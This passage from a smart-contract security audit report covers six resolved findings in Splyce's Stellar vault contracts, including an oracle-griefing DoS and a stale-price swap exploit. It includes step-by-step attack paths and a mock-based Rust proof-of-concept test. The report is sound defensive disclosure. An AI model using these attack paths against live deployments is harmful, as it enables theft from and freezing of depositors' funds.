**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding `effective_staleness_looseness`/`effective_deviation_looseness` (0 = loosest, fail-closed) to gate `accept_allowlist_mint` on counterparty parity and re-verifying stricter-of-both staleness plus exact deviation-band parity in `swap_tokens`.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-006] Unbounded Vaults Vec in Instance Storage Creates Permanent Factory DoS

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 5.86 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:H/I:M/D:N/Y:N) (source: HAL-06) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | liveness-dos |
| **Location** | `contracts/factory/src/factory.rs`, `contracts/factory/src/storage.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/284ead3c4f6ad662e031d2be408f8b1d293864e4 |
| **Redacted** | false |

**Description.**

`Factory.deploy_vault()` appends each newly deployed vault address to a single `Vec<Address>` stored under the `Vaults` key in instance storage, then writes the entire updated vector back on every deployment. Instance storage in Soroban is a single ledger entry whose serialized size is bounded by the network's ledger entry size limit. A Stellar contract address serializes to 40 bytes in XDR (`SCVal` discriminant 4 B + `ScAddress` discriminant 4 B + 32-byte hash). Once the cumulative size of all instance storage entries exceeds this limit, every call to `write_vaults` fails, causing `deploy_vault` to revert permanently.

This is an operational scaling cliff rather than an immediately triggerable attack: `deploy_vault` is admin-gated, so a malicious non-admin cannot force the DoS. However, at any realistic protocol scale where hundreds of vaults are deployed over time, the factory will eventually hit the limit and become permanently unable to deploy new vaults. There is no `MAX_VAULTS` constant, no pruning mechanism, and no migration path within the existing factory design.

#### Code Location

`Factory.deploy_vault()`**:** unbounded O(n) append to instance storage

```rust
// contracts/factory/src/factory.rs, lines 139–165
let mut vaults = read_vaults(&env);          // O(n) read of entire Vec
vaults.push_back(vault_address.clone());     // unbounded append
write_vaults(&env, &vaults);                // O(n) write back, fails when limit exceeded
```

`write_vaults()`**:** single instance entry, no size guard

```rust
// contracts/factory/src/storage.rs, lines 37–40
pub fn write_vaults(e: &Env, vaults: &Vec<Address>) {
    let key = StorageKey::Vaults;
    e.storage().instance().set(&key, vaults); // panics when entry exceeds ledger size limit
}
```

**Impact.**

Once the `Vaults` vector reaches the instance storage size limit, every subsequent call to `deploy_vault` fails permanently. The factory cannot deploy any new vaults without redeploying the factory contract itself and migrating all downstream integrations (vault registries, UIs, dependent contracts) to the new address. The scaling cliff is unmigratable within the current design: there is no prune, paginate, or move-to-persistent-storage function. The O(n) read-modify-write on every deployment also means both compute and storage fees grow linearly with vault count well before the hard limit is reached.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Move the vault registry from a single instance-storage `Vec<Address>` to per-entry persistent storage keyed by a sequential counter. Instance storage holds only a 4-byte count; each vault address becomes a separate persistent entry, eliminating instance storage growth.
- As a simpler interim measure, enforce a hard cap (e.g., `MAX_VAULTS: u32 = 200`) and revert `deploy_vault` if exceeded, preventing silent failure at an unpredictable threshold.
- If an on-chain vault registry is not strictly required, remove it and rely entirely on the `VaultDeployed` event (which already carries `vault_index` and address) for off-chain indexers.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding across commits [e7de7a6](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/e7de7a606237113252f40c91d5d130ebe5d915bf), [284ead3](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/284ead3c4f6ad662e031d2be408f8b1d293864e4) by moving the vault registry from a single unbounded instance-storage `Vec` to a fixed-size `VaultCount` instance entry plus per-index `Vault(u32)` persistent entries, following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-007] Unpermissioned Fee Accrual Enables Persistent DoS on NavOracle Price Updates

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 5.86 (AO:A/AC:M/AX:L/R:N/S:U/C:N/A:H/I:N/D:M/Y:N) (source: HAL-07) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/nav_oracle/src/nav_oracle.rs:L162-L164`, `contracts/stoken/src/stoken.rs:L1368`, `contracts/stoken/src/stoken.rs:L2874-L2878`, `contracts/stoken/src/stoken.rs:L3019-L3023`, `contracts/stoken/src/stoken.rs:L2136-L2159` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/7598ec29f265301256a0c09b8a5a8a07624e529e |
| **Redacted** | false |

**Description.**

`NavOracle.update_vault_price_from_nav()` hard-reverts with `TotalSupplyMismatch` when the on-chain `total_supply()` at execution time differs by even 1 unit from the `expected_total_supply` parameter the NAV provider computed off-chain (nav_oracle.rs:162–164). Any account can atomically change `total_supply` by calling `SToken.accrue_management_fee()`, which is an unconditionally public, zero-auth function (stoken.rs:1368) that mints fee shares to the accountant whenever `management_fee_bps_per_year > 0`. Because the NAV provider must read the supply off-chain, sign, and broadcast an oracle transaction before it lands on-chain, there is always a gap during which any account can submit `accrue_management_fee` in the same or a preceding ledger close, advancing the supply by at least 1 unit and triggering reversion.

**Attack flow:**

1. NAV provider reads `total_supply = S` at ledger N and broadcasts `update_vault_price_from_nav(nav_value, S)`.
2. Attacker submits `accrue_management_fee()` (no auth required) in the same ledger; supply becomes `S + k` (k ≥ 1; at 100 bps/year on a 10¹² share vault, k ≈ 31 709 per day).
3. Oracle tx executes: `total_shares (S+k) != expected_total_supply (S)` → reverts with `TotalSupplyMismatch`. No price update occurs.
4. Attacker repeats once per oracle attempt. The default `price_update_cooldown_secs = 300s` applies only to successful updates; a failed transaction (`TotalSupplyMismatch`) writes nothing and resets no state, so the oracle can retry immediately after each failure. The attacker must keep pace with the oracle's retry cadence using automated submissions.
5. After `max_price_staleness_secs` (default 86 400 s / 24 h) with no successful update, price is stale.

#### Code Location

`NavOracle.update_vault_price_from_nav()`: exact equality guard on off-chain supply snapshot

```rust
// contracts/nav_oracle/src/nav_oracle.rs
let stoken_asset = FungibleTokenClient::new(&env, &stoken_address); // line 155
let total_shares = stoken_asset.total_supply();

if total_shares != expected_total_supply { // line 162
    return Err(NavOracleError::TotalSupplyMismatch);
}
```

`SToken.accrue_management_fee()`: no caller restriction

```rust
// contracts/stoken/src/stoken.rs
/// Accrue management fee (anyone can call)
pub fn accrue_management_fee(env: Env) -> Result<(), STokenCoreError> { // line 1368
    // ...
    Base::mint(&env, &accountant, fee_shares as i128); // line 1400 increases total_supply
}
```

**Impact.**

Once the price is stale, the `PriceTooOld` gate fires across all three primary vault operations simultaneously: `deposit_core` (stoken.rs:2874–2878), `redeem_core` (stoken.rs:3019–3023), and `swap_tokens` (stoken.rs:2136–2159) all revert. No new deposits, withdrawal requests, or swaps are possible, leaving users with no way to act on their capital for as long as the attack is maintained. The vault recovers once the attack stops and the oracle updates successfully. The attack requires no privileged role and costs only Stellar transaction fees (fractions of a cent per oracle cycle). The same reversion also occurs organically whenever any honest deposit, withdrawal, or management fee accrual lands in the same ledger as an oracle tx, making the oracle brittle even without a malicious actor.

**Proof / attack path.**

#### Code

The PoC code has been added to the existing test suite located in the `contracts/nav_oracle/src/test.rs` file, under the test function `poc_accrue_management_fee_griefs_nav_oracle_dos`. A helper method `set_supply` was also added to `MockSToken` in the same file to simulate the supply change caused by `SToken::accrue_management_fee()`.

```rust
// ─── PoC: Unpermissioned supply mutation griefs oracle DoS ──────────

/// PoC for finding:
/// "Unpermissioned Fee Accrual Enables Persistent DoS on NavOracle Price Updates"
///
/// §A NavOracle stores expected_total_supply as an off-chain snapshot.
/// §B Any EOA can call SToken.accrue_management_fee() (no auth required) to mint fee
///    shares and change total_supply between the provider's read and the oracle tx.
/// §C The strict equality guard (total_shares != expected_total_supply) then reverts
///    the oracle update with TotalSupplyMismatch, preventing any price update.
/// §D Repeating this once per oracle attempt keeps the price stale indefinitely.
#[test]
fn poc_accrue_management_fee_griefs_nav_oracle_dos() {
    let env = Env::default();
    env.ledger().with_mut(|li| li.timestamp = 10_000);

    // §A: vault has 1_000_000_000_000 shares outstanding; management_fee_bps > 0 in production
    let initial_supply: i128 = 1_000_000_000_000;
    let ctx = setup_nav_oracle(&env, 0, 500_000_000_000, initial_supply);

    // §B: NAV provider reads total_supply = S off-chain, broadcasts oracle tx
    let nav_value: u64 = 500_000_000_000;
    let expected_supply = initial_supply; // S

    // §C: attacker calls accrue_management_fee() — public, no auth — supply becomes S + k
    // Real SToken at 100 bps/year with 1e12 supply mints ~31_709 fee shares per day;
    // here we model the supply increment directly via set_supply (same net effect).
    let supply_after_accrual = initial_supply + 31_709; // one day of fee accrual
    ctx.mock_stoken.set_supply(&supply_after_accrual);

    // §D: oracle tx reverts — total_shares (S+k) != expected_total_supply (S)
    let result = ctx
        .client
        .mock_auths(&[MockAuth {
            address: &ctx.provider,
            invoke: &MockAuthInvoke {
                contract: &ctx.address,
                fn_name: "update_vault_price_from_nav",
                args: (nav_value, expected_supply, ctx.provider.clone()).into_val(&env),
                sub_invokes: &[],
            },
        }])
        .try_update_vault_price_from_nav(&nav_value, &expected_supply, &ctx.provider);

    assert!(result.is_err()); // TotalSupplyMismatch — price not updated
    assert_eq!(ctx.mock_stoken.get_last_price(), 0); // price unchanged

    // §E: attacker repeats on the next oracle attempt — persistent DoS confirmed
    env.ledger().with_mut(|li| li.timestamp = 13_600); // one hour later

    let expected_supply_v2 = supply_after_accrual;
    ctx.mock_stoken.set_supply(&(supply_after_accrual + 31_709)); // another day of accrual

    let result2 = ctx
        .client
        .mock_auths(&[MockAuth {
            address: &ctx.provider,
            invoke: &MockAuthInvoke {
                contract: &ctx.address,
                fn_name: "update_vault_price_from_nav",
                args: (nav_value, expected_supply_v2, ctx.provider.clone()).into_val(&env),
                sub_invokes: &[],
            },
        }])
        .try_update_vault_price_from_nav(&nav_value, &expected_supply_v2, &ctx.provider);

    assert!(result2.is_err()); // still reverts — price permanently blocked
    assert_eq!(ctx.mock_stoken.get_last_price(), 0); // price still never applied
}
```

#### Execution

```sh
cargo test --package nav_oracle -- test::poc_accrue_management_fee_griefs_nav_oracle_dos --exact --nocapture
```

#### Result

```sh
running 1 test
test test::poc_accrue_management_fee_griefs_nav_oracle_dos ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 15 filtered out; finished in 0.02s
```

#### Analysis

The test directly exercises the interaction between `NavOracle.update_vault_price_from_nav()`'s `expected_total_supply` equality guard (nav_oracle.rs:162–164) and `SToken.accrue_management_fee()`'s unconditional supply-minting path (stoken.rs:1368). It demonstrates the attack in two consecutive oracle cycles to confirm the DoS is repeatable.

- **§C–§D (first oracle cycle):** After the NAV provider reads `total_supply = 1_000_000_000_000` off-chain, the attacker models calling `accrue_management_fee()` by incrementing the mock supply by 31 709 (one day of 100 bps/year fee accrual on 10¹² shares). The oracle tx then reverts because `total_shares (1_000_031_709) != expected_total_supply (1_000_000_000_000)`. The assertion `assert!(result.is_err())` confirms the reversion, and `assert_eq!(ctx.mock_stoken.get_last_price(), 0)` proves no price was ever applied: the vault's staleness clock continues ticking.
- **§E (second oracle cycle):** One hour later, the provider re-reads supply and submits again. The attacker again increments the supply by 31 709. The second oracle attempt reverts identically. Both assertions pass, proving the DoS is indefinitely repeatable at the cost of one cheap, auth-free transaction per oracle attempt. Because `max_price_staleness_secs` defaults to 86 400 s (24 h) and oracle updates are infrequent, a handful of such transactions per day is sufficient to keep the vault permanently frozen for deposits, withdrawal requests, and swaps.
- **Zero-fee attack cost:** `accrue_management_fee()` requires no authentication, no special role, and no capital. The attacker's only cost is the Stellar transaction fee (fractions of a cent per ledger). The vault's entire user base, all depositors unable to enter or exit, bears the full impact.
- **Latent fragility even without a malicious actor:** The same reversion occurs organically whenever any honest deposit, withdrawal, or management fee accrual lands in the same ledger close as the oracle tx, making the oracle brittle under normal protocol load without any adversarial intent.

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Remove the `expected_total_supply` equality guard. Instead, `read total_supply()` atomically on-chain within `update_vault_price_from_nav` and compute the price from the live supply. This applies the same pattern already used by the oracle for underlying balances, eliminating the off-chain/on-chain divergence entirely.
- Add an explicit guard for a zero total supply to prevent a division-by-zero on freshly deployed vaults before any shares have been minted.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by removing the off-chain `expected_total_supply` equality gate and computing the price directly from the live on-chain `total_supply()`, with an added zero-supply guard.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-008] Accountant.distribute_tokens Strands Fee Shares From Secondary Vaults

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 5.86 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:M/D:N/Y:H) (source: HAL-08) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/accountant/src/accountant.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/2ddb07793fc7b93bfb704625e525632dba9af114 |
| **Redacted** | false |

**Description.**

`Accountant.distribute_tokens()` reads a single hardcoded `token` address written at initialization and transfers only that token to `recipient1` and `recipient2`. There is no distribution path for any other token type.

When the same Accountant contract address is registered as the `accountant` role for multiple SToken vaults whose share tokens differ (e.g., vault A with share token `sToken-A` and vault B with share token `sToken-B`, with the Accountant initialized with `token = sToken-A`), fee shares from vault B accumulate in the Accountant's balance but can never be distributed: `distribute_tokens` only transfers `sToken-A`.

**Exploit scenario:**

1. The same Accountant address is registered as the `accountant` role for vault A (`share_token = sToken-A`) and vault B (`share_token = sToken-B`). Accountant initialized with `token = sToken-A`.
2. Both vaults generate deposit, withdrawal, and swap fee shares and mint them to the Accountant address.
3. `distribute_tokens(amount, processor)` successfully distributes `sToken-A` fee shares.
4. `sToken-B` fee shares in the Accountant's balance have no distribution function; they remain in the contract's balance indefinitely with no code path capable of moving them out.

#### Code Location

`Accountant.distribute_tokens()`**:** single hardcoded token, no per-vault routing

```rust
#[only_role(caller, "processor")] // line 162
pub fn distribute_tokens(
    env: Env,
    amount: u64,
    caller: Address,
) -> Result<(), AccountantError> {
    // ...
    let token = read_token(&env); // line 178, single token set at init, no other token can be distributed
    // ...
    let token_client = Client::new(&env, &token);
    token_client.transfer(&accountant, &recipient1, &(amount1 as i128));
    token_client.transfer(&accountant, &recipient2, &(amount2 as i128));
    // ...
}
```

**Impact.**

- All fee-share income from any vault whose share token differs from the Accountant's initialized `token` is permanently stranded in the Accountant contract with no on-chain recovery mechanism.
- Recipients lose the corresponding fee income; if this spans multiple vaults, total stranded value scales with TVL and fee rates of every secondary vault sharing the same Accountant.
- Severity is conditional: this manifests only if a single Accountant is shared across vaults with differing share tokens (a valid and documented deployment configuration); it does not manifest if each vault is configured with its own dedicated Accountant instance.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a `distribute_tokens_by_address(token: Address, amount: u64, caller: Address)` overload that accepts an arbitrary token address, allowing the processor to distribute fee shares for any vault. This is a lighter fix than per-vault balance mapping and directly addresses the root cause: the inability to distribute tokens other than the one set at initialization.
- If the Accountant is intended to be shared across multiple vaults, also add per-vault accumulated-fee tracking so that `amount` cannot exceed the fees actually earned for a given token, preventing over-distribution.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding a processor-gated `distribute_tokens_by_address(token, amount, caller)` overload that routes any token balance through the shared `split_and_transfer` helper, exactly per the recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-009] ERC-4626 Receiver Address Bypasses Whitelist Controls On Deposit And Withdrawal Paths

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 5.03 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:H/D:N/Y:N) (source: HAL-09) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | access-control-auth |
| **Location** | `contracts/stoken/src/stoken.rs:L2882-L2884`, `contracts/stoken/src/stoken.rs:L3286-L3290`, `contracts/stoken/src/stoken.rs:L3027-L3029`, `contracts/stoken/src/stoken.rs:L1292-L1296` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/130b06a4a5bcc612b77335f47f1a7f748ff5ee32 |
| **Redacted** | false |

**Description.**

The `SToken` vault enforces access controls via separate deposit and withdrawal whitelists `deposit_whitelist_enabled`, `withdrawal_whitelist_enabled`). Both controls share the same class of vulnerability: the `receiver` address in ERC-4626-compatible entry points is never validated against the respective whitelist, allowing a whitelisted caller to route tokens to a non-whitelisted address on both deposit and withdrawal paths.

**Deposit side:** `deposit_core()` validates the `operator` address but not the `receiver` (the address that receives minted shares). The ERC-4626 `FungibleVault::deposit()` and `mint()` entry points accept a `receiver` distinct from `operator`, so a whitelisted operator can mint shares directly to a non-whitelisted address.

**Withdrawal side:** `redeem_core()` validates the `owner` (share holder) but not the `receiver` stored in the `WithdrawalRequest`. The ERC-4626 `redeem()` and `withdraw()` entry points accept a `receiver` distinct from `owner`; this address is stored in the request and later used as the payout destination in `fulfill_withdrawal()` without any whitelist check at either stage.

Both bypass paths are exclusive to the ERC-4626 entry points. The native `deposit_underlying` path forces `receiver = beneficiary.unwrap_or(caller)` with `caller` as operator, making `receiver == operator` in the default case. The native `withdraw_request` path forces all three parameters `owner`, `receiver`, `operator`) to be `caller`, so no bypass is possible there either.

Step-by-step (deposit bypass):

1. Vault has deposit whitelist enabled. Alice is whitelisted; Bob is not.
2. Alice calls `FungibleVault::deposit(amount=1000, receiver=bob, from=alice, operator=alice)`.
3. `deposit_core` checks `read_is_deposit_whitelisted(env, operator=alice)` → passes.
4. `receiver=bob` is never checked against the whitelist.
5. Underlying tokens transferred from Alice; `Base::mint(bob, shares)` executed.
6. Bob holds vault shares despite never being vetted by the whitelist.

Step-by-step (withdrawal bypass):

1. Vault has withdrawal whitelist enabled. Alice is whitelisted; Charlie is not.
2. Alice calls `FungibleVault::redeem(shares=100, receiver=charlie, owner=alice, operator=alice)`.
3. `redeem_core` checks `read_is_withdrawal_whitelisted(env, owner=alice)` → passes.
4. `WithdrawalRequest { receiver: charlie, ... }` is stored with status PENDING.
5. `receiver=charlie` is never checked in `redeem_core` or `fulfill_withdrawal`.
6. Processor calls `fulfill_withdrawal`. Underlying tokens are transferred to Charlie, who was never approved.

#### Code Location

`SToken.deposit_core()`**:** whitelist checks operator, not receiver

```rust
if read_deposit_whitelist_enabled(env) && !read_is_deposit_whitelisted(env, operator) {
    return Err(STokenCoreError::UserNotWhitelisted);
}
```

`SToken.deposit()`**:** receiver and operator are distinct parameters

```rust
fn deposit(e: &Env, assets: i128, receiver: Address, from: Address, operator: Address) -> i128 {
    operator.require_auth();
    // receiver is never checked against the whitelist
    Self::deposit_core(e, &from, &receiver, &operator, assets_u64, None)
}
```

`SToken.redeem_core()`**:** whitelist checks owner only, receiver stored unchecked

```rust
if read_withdrawal_whitelist_enabled(env) && !read_is_withdrawal_whitelisted(env, owner) {
    return Err(STokenCoreError::UserNotWhitelisted);
}
```

`SToken.fulfill_withdrawal()`**:** funds transferred to unchecked receiver

```rust
underlying_asset.transfer(
    &vault_address,
    &withdrawal_request.receiver,
    &(amount_to_pay as i128),
);
```

**Impact.**

- A whitelisted operator can mint vault shares to any non-whitelisted address via the ERC-4626 deposit paths, bypassing access controls that may encode regulatory (KYC/AML), geographic, or institutional restrictions.
- A whitelisted owner can direct underlying token payouts to any non-whitelisted address via the ERC-4626 redemption paths, with the bypass completing when the processor calls `fulfill_withdrawal`.
- Both vectors allow non-vetted addresses to hold vault shares or receive underlying tokens, constituting a compliance violation in regulated contexts.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- **Deposit side:** Change the whitelist check in `deposit_core` to validate the `receiver` (share beneficiary) instead of the `operator`. If the intent is to restrict both the initiating party and the beneficiary, check both addresses.
- **Withdrawal side:** In `redeem_core()`, add a whitelist check for `receiver` in addition to the existing `owner` check.
- Apply the same receiver check to `fulfill_withdrawal()` as a defense-in-depth measure before transferring underlying tokens, providing a safety net even if the request was created through a path that did not validate the receiver.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-010] Swap Reads Accepted Price, Ignoring Pending Downward Price Drop

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 5.03 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:N/D:H/Y:N) (source: HAL-10) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/6a0e7d5b422cc35306401d8a0f9f22892a775ee3 |
| **Redacted** | false |

**Description.**

`SToken.swap_tokens()` reads vault prices exclusively via `read_price` and never consults `read_pending_price`. When the oracle submits a price exceeding `max_deviation_bps`, the update is queued as `PendingPrice` and `read_price` remains at the stale pre-drop value. Because `update_price` does not call `write_last_price_update_timestamp` on the pending path (see related finding **FIND-011**), the staleness check in `swap_tokens` (lines 2136–2146) also passes, treating the accepted price as fresh.

A user monitoring on-chain `PricePending` events can therefore swap out of the affected vault at the stale, higher price before the pending drop is applied. The window differs by deviation: for deviations at or below `MAX_MANAGER_BYPASS_DEVIATION_BPS` (2000 bps), the manager can call `accept_price` immediately; for deviations above 20%, acceptance is blocked for the full `price_acceptance_cooldown_secs` (default 5 minutes) even for the manager, creating a guaranteed minimum window. The manager can call `reject_price` at any time, but doing so discards a legitimate NAV correction.

Concrete exploit path:

1. Oracle reports a 15% NAV drop for source vault A. `update_price` stores `PendingPrice { value: 0.85 * old_price, timestamp: T }` and emits `PricePending`. `read_price` remains at the old value.
2. Attacker reads the `PricePending` event and calls `swap_tokens(A → B)`. The staleness check at line 2143 passes because `read_last_price_update_timestamp` was not updated on the pending path.
3. At line 2170, `source_price = read_price(&env)` uses the stale pre-drop price; the attacker's A shares are valued at the inflated rate, minting excess B shares.
4. Manager calls `accept_price`; the pending drop is applied. For deviations above 20%, `can_manager_bypass` is `false` (line 1467) and acceptance is blocked until the cooldown expires regardless of manager response time.

#### Code Location

`SToken.swap_tokens()`**:** reads only accepted price; no pending price consulted

```rust
// contracts/stoken/src/stoken.rs
let source_price = read_price(&env);                          // line 2170
let dest_price = desitnation_vault_client.price();            // line 2171
// read_pending_price(&env) is never consulted for source or destination
```

`SToken.update_price()`**:** pending branch does not advance `last_price_update_timestamp`

```rust
// contracts/stoken/src/stoken.rs
// High-deviation (pending) branch:
write_pending_price(&env, Some(PendingPrice { value: new_price, timestamp })); // line 986-992
// write_last_price_update_timestamp NOT called, staleness check in swap_tokens sees old timestamp
```

**Impact.**

Any user monitoring on-chain `PricePending` events can exit the affected vault at the stale accepted price, transferring the unrealized loss to remaining holders. The exploit requires no privileged role. For price drops exceeding 20% (`MAX_MANAGER_BYPASS_DEVIATION_BPS`), the manager cannot bypass the mandatory `price_acceptance_cooldown_secs`, giving the attacker a guaranteed minimum exploitation window of at least 5 minutes (default) even if the manager responds immediately.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend rejecting swap execution on either vault when a pending price exists on that vault, blocking the operation until the pending price is resolved (accepted or rejected). This check must cover both the source and destination vaults, requiring the destination vault interface to expose whether a pending price is present so the source vault can query it as part of the swap precondition validation.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-011] Emergency Sweep Bypasses Vault total_idle Accounting

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 4.71 (AO:A/AC:L/AX:M/R:P/S:C/C:N/A:H/I:H/D:H/Y:N) (source: HAL-11) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | access-control-auth |
| **Location** | `contracts/proxy_asset_manager/src/proxy_asset_manager.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4690a1715aa589b8cb4ea288e7179afb4e2e2b6e |
| **Redacted** | false |

**Description.**

`ProxyAssetManager.emergency_sweep()` transfers underlying tokens directly to the SToken vault address via a raw SAC `token_client.transfer` call without subsequently invoking `stoken::return_funds`, leaving the vault's `total_idle` counter understated by the swept amount. `emergency_sweep` is gated to the manager role and requires the proxy to be paused (also manager-gated, with no precondition of its own) plus an elapsed `emergency_cooldown`; neither check verifies that a genuine emergency is actually underway.

After the sweep, the vault's true balance exceeds `total_idle` by exactly the swept amount, a state that is indistinguishable on-chain from a routine accidental deposit. `SToken` exposes exactly one manager-callable function that appears purpose-built for that symptom, `withdraw_unexpected_deposits`, and it does not reconcile `total_idle`: it transfers the excess straight out of the vault to the caller instead.

**Exploit path (realistic partial-idle scenario):**

1. Vault has `total_idle = 50,000 USDC` on-chain; ProxyAssetManager holds `500,000 USDC` from prior `process_deposits` calls.
2. Manager pauses the proxy (no precondition) and waits for `emergency_cooldown` to elapse.
3. Manager calls `emergency_sweep(500_000, manager)`; `token_client.transfer(proxy, vault, 500_000)` executes; vault balance is now `550,000 USDC`, `total_idle` is unchanged at `50,000 USDC`.
4. Seeing `vault_balance > total_idle`, the manager calls `withdraw_unexpected_deposits(underlying_token, 500_000, manager)`, the function whose name and behavior match this symptom, to "reconcile" the mismatch.
5. `Client::new(...).transfer(&vault_address, &caller, &(amount as i128))` sends the `500,000 USDC` to the manager; `total_idle` is still never touched.
6. A pending withdrawal request requiring `300,000 USDC` payout calls `fulfill_withdrawal`; `amount_to_pay (300,000) > read_total_idle (50,000)` reverts with `InsufficientBalance`, and the vault no longer holds the funds to cover it even if that check were bypassed, they are now in the manager's wallet.

#### Code Location

`ProxyAssetManager.emergency_sweep()`**:** missing `return_funds` call

```rust
let proxy_address = env.current_contract_address(); // line 394
// ...
let vault = read_vault(&env);
token_client.transfer(&proxy_address, &vault, &(transfer_amount as i128)); // line 410, tokens arrive at vault
// NO call to stoken.return_funds(...), total_idle is never incremented
EmergencySweepExecuted { ... }.publish(&env);
Ok(())
```

`ProxyAssetManager.return_funds()`**:** correct two-step pattern (contrast)

```rust
token_client.transfer(&proxy_address, &vault, &(amount as i128)); // line 351
let stoken = STokenClient::new(&env, &vault);
stoken.return_funds(&amount, &proxy_address); // line 355, total_idle incremented
```

`SToken.fulfill_withdrawal()`**:** blocks payout when `total_idle` is understated

```rust
if amount_to_pay > vault_balance { // line 1280
    return Err(STokenWithdrawalRequestError::InsufficientVaultFunds);
}
if amount_to_pay > read_total_idle(&env) { // line 1283, fires even though the check above passed
    return Err(STokenWithdrawalRequestError::InsufficientBalance); // line 1284
}
```

`SToken.withdraw_unexpected_deposits()`**:** treats the swept liquidity as a stray deposit and drains it out

```rust
#[only_role(caller, "manager")] // line 1706
pub fn withdraw_unexpected_deposits(
    env: Env,
    token_mint: Address,
    amount: u64,
    caller: Address,
) -> Result<(), STokenCoreError> {
    // ...
    // available_unexpected is derived as vault_balance - total_idle, line 1730-1739
    // ...
    Client::new(&env, &token_mint).transfer(&vault_address, &caller, &(amount as i128)); // line 1760, sends the swept liquidity to the manager; total_idle is never touched
    Ok(())
}
```

`SToken.accept_roles()`**:** existing governance path that can reassign `asset_manager` without an upgrade (contrast)

```rust
let asset_manager_role = Symbol::new(&env, "asset_manager"); // line 575
// ...
if let Some(asset_manager) = pending_roles.new_asset_manager { // line 624
    access_control::grant_role_no_auth(&env, &caller, &asset_manager, &asset_manager_role); // line 625, manager can grant itself asset_manager after the role_change_cooldown
    // ...
}
```

**Impact.**

Once a manager runs this sequence, in good faith and using the function whose name and design suggest it is built for exactly this symptom (`withdraw_unexpected_deposits`), the swept liquidity is transferred out of the vault to the manager's own address, and `total_idle` remains understated. Every pending withdrawal request whose payout depended on that liquidity becomes unpayable until the manager separately restores backing liquidity, a direct loss of depositor principal that requires no compromise, no attacker, and no privilege escalation beyond the manager role the protocol already grants for routine operations. A safe, on-chain, upgrade-free recovery path exists via `stoken::propose_roles`/`accept_roles`, but it is not surfaced anywhere in the contract, so it is unlikely to be used under time pressure; if the manager instead uses `withdraw_unexpected_deposits`, the transferred funds cannot be recovered on-chain.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Update `emergency_sweep` to call `stoken.return_funds(transfer_amount, proxy_address)` immediately after the token transfer, mirroring the two-step pattern in `ProxyAssetManager.return_funds()`. This closes the root cause and prevents the `vault_balance > total_idle` state from ever arising.
- Independently, harden `withdraw_unexpected_deposits` so it cannot drain liquidity required to cover `total_withdrawals_pending`: cap the eligible amount at `vault_balance - total_idle - outstanding_backing_requirement` (or an equivalent check against `read_shares_in_custody`/`read_total_withdrawals_pending`), so that even if the first bug recurs, the manager cannot sweep out funds that pending withdrawals depend on.
- Add a manager-callable (or asset_manager-callable) reconciliation function that can increment `total_idle` to match the true balance without requiring a fresh token transfer, so an already-corrupted state can be repaired on-chain without redeploying, and without the multi-step `propose_roles`/`accept_roles` detour.
- Emit an event whenever `vault_balance` diverges from `total_idle` by a nontrivial amount so operators are alerted to the mismatch before reaching for `withdraw_unexpected_deposits`.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

